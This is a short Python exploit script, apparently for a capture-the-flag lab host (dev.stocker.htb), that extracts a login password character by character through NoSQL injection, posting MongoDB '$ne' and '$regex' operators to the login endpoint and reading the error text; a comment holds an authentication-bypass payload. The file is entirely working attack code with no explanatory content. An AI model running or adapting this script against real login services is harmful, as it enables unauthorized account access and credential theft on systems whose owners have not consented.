import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()
from pwn import *

username="admin"
password=""
u="http://dev.stocker.htb/login"
headers={'content-type': 'application/json'}

p1 = log.progress("Password bruteforcer")
p2 = log.progress("Password: ")
while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            p1.status(f"Probando con la letra {c}")
        	# {"username": {"$ne": "admin"}, "password": {"$ne": "admin" }}
            payload='{"username": {"$ne": "test"}, "password": {"$regex": "^%s" }}' % (password + c)
            r = requests.post(u, data = payload, headers = headers)
            if "Invalid username or password." not in r.text:
                password += c
                p2.status(password)
                break
